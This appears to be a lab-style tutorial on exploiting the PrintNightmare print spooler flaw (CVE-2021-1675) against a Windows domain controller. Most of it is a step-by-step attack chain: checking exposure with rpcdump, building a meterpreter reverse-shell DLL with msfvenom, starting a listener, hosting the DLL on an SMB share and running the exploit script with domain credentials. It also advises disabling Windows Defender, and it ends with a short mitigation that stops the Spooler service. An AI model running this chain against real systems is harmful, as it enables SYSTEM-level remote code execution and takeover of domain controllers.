PrintNightmare might be the biggest bugs to hit 2021. It takes advantage of the printer spooler. And that printer spooler has a functionality that allows users to add printers and that runs as system privilege. Since it runs on system privileges, it can do remote code execution on system privileges. It is very dangerous.

First we will check whether this is vulnerable on our environment or not:

```bash
rpcdump.py @<IP_of_DC> | egrep 'MS-RPRN|MS-PAR'
```

If you see Print System Asynchronous Remote Protocol and Print System Remote Protocol, we are vulnerable

For running this attack, we need the latest version of impacket

```bash
pip3 uninstall impacket
git clone https://github.com/cube0x0/impacket
cd impacket
python3 ./setup.py install
```

So, afterwards, we will be running this code with a malicious dll and we will be hosting that dll. Lets first create the malicious dll

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp/ LHOSTS=<our_ip_address> LPORT=5555 -f dll > shell.dll
```

Paralelly, we start msfconsole

```shell
msfconsole
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lport 5555
set lhost <your_IP>
run
```

Next, we need to setup a fileshare. Thats where impacket comes in. 

```bash
smbserver.py share 'pwd' -smb2support
```

Then we can run the following script:

```bash
python3 CVE-2021-1675.py marvel.local/<user>:<password>@<DC_IP> '\\<your_IP>\share\shell.dll'
```

Note: Turn off Windows Defender to run this attack successfully.

Mitigation:

Disable spooler service. 
```powershell
Stop-Service Spooler
REG ADD  "HKLM\SYSTEM\CurrentControlSet\Services\Spooler"  /v "Start" /t REG_DWORD /d "4" /f
```

